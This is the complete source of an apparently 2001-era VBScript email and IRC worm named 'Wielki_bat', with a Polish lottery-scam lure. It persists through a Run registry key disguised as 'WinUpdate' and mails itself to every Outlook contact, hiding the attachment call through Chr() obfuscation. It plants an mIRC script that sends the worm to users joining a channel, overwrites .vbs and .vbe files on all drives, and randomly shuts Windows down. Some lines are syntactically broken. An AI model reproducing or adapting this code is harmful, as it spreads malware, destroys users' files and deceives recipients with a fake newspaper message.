'Vbs.Wielki_bat Produkcja: Robin.Hooj. 5/9/2001
Set SG84KH2F = createobject("scripting.filesystemobject")
FRS58KB1 = SG84KH2F.getspecialfolder(0)
MB64TQQ8 = FRS58KB1 & "\Wielki_bat.vbs"
Set AIP81A6V = createobject("wscript.shell")
AIP81A6V.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & MB64TQQ8 & " %"
SG84KH2F.copyfile wscript.scriptfullname, MB64TQQ8
J363F7FO
If AIP81A6V.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Wielki_bat\DR21278B") <> 1 then
O02U6MK2
End if
If AIP81A6V.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Wielki_bat\G5FB5D2J") <> 1 then
E3D1VU84 ""
End if

Function O02U6MK2()
Set LDDKTM7C = CreateObject("Outlook.Application")
If LDDKTM7C = "Outlook" Then
Set BV979O43 = LDDKTM7C.GetNameSpace("MAPI")
Set BSID4GFT = BV979O43.AddressLists
For Each GOM1JI1J In BSID4GFT
If GOM1JI1J.AddressEntries.Count <> 0 Then
OM31U595 = GOM1JI1J.AddressEntries.Count
For L0QK7Q39 = 1 To OM31U595
Set LN6FD130 = LDDKTM7C.CreateItem(0)
Set HQ4S18DE = GOM1JI1J.AddressEntries(L0QK7Q39)
LN6FD130.To = HQ4S18DE.Address
LN6FD130.Subject = "Patrz co mam!!!"
LN6FD130.Body = "Patrz co mam od "Gazety Wyborczej" "Totalizator oszuka³ nas wszystkich. W za³¹czniku przysy³amy program umo¿liwiaj¹cy poznanie wyników losowania Multilotka juz o 19:00 czyli d³ugo przed losowaniem. Mo¿na dziêki temu sporo wygraæ. Zasadê dzia³ania i czemu on slu¿y opiszemy w nied³ugim czasie na ³amach naszego dziennika w artykule "Wielki Bat". £adna sensacja." & vbcrlf & ""
execute "set A3O82775 =LN6FD130." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
EDMFI4AU = MB64TQQ8
LN6FD130.DeleteAfterSubmit = True
A3O82775.Add EDMFI4AU
If LN6FD130.To <> "" Then
LN6FD130.Send
End If
Next
End If
Next
End If
End function
Function E3D1VU84(G6T4T2QB)
If G6T4T2QB <> "" Then
CS3F2MVV = AIP81A6V.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If SG84KH2F.fileexists("c:\mirc\mirc.ini") Then
G6T4T2QB = "c:\mirc"
ElseIf SG84KH2F.fileexists("c:\mirc32\mirc.ini") Then
G6T4T2QB = "c:\mirc32"
ElseIf SG84KH2F.fileexists(CS3F2MVV & "\mirc\mirc.ini") Then
G6T4T2QB = CS3F2MVV & "\mirc"
ElseIf SG84KH2F.fileexists(CS3F2MVV & "\mirc32\mirc.ini") Then
G6T4T2QB = CS3F2MVV & "\mirc"
Else
G6T4T2QB = ""
End If
End If
If G6T4T2QB <> "" Then
Set C04HR665 = SG84KH2F.CreateTextFile(G6T4T2QB & "\script.ini", True)
C04HR665 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
C04HR665 = C04HR665 & vbCrLf & "n0=on 1:JOIN:#:{"
C04HR665 = C04HR665 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
C04HR665 = C04HR665 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
C04HR665 = C04HR665 & MB64TQQ8
C04HR665 = C04HR665 & vbCrLf & "n3=}"
script.Close
End If
End Function
Function NS9G84KH()
On Error Resume Next
Set ADV4634R = SG84KH2F.Drives
For Each E3CIP81A In ADV4634R
F1DRS58K = E3CIP81A & " \ "
Call B71B64TQ(F1DRS58K)
Next
End Function

Function B71B64TQ(Q7H363F7)
F3MR2127 = Q7H363F7
Set NU402U6M = SG84KH2F.GetFolder(F3MR2127)
Set KAK5FB5D = NU402U6M.Files
For Each LVK352RQ In KAK5FB5D
If SG84KH2F.GetExtensionName(LVK352RQ.path) = "vbs"
SG84KH2F.CopyFile wscript.scriptfullname,LVK352RQ.path,true
End if
If SG84KH2F.GetExtensionName(LVK352RQ.path) = "vbe"
SG84KH2F.CopyFile wscript.scriptfullname,LVK352RQ.path,true
End if
Next
Set SURVV0PI = NU402U6M.Subfolders
For Each L42RL8VK In SURVV0PI
Call (L42RL8VK.path)
Next
End function
Function J363F7FO()
Randomize
If 1 + Int(Rnd * 50) = 7 then
AIP81A6V.run "RUNDLL32.EXE user.exe,exitwindows"
end if
end function
'Macie przesun¹æ Now¹ Maturê bo bêd¹ nowe destrukcyjne wirusy
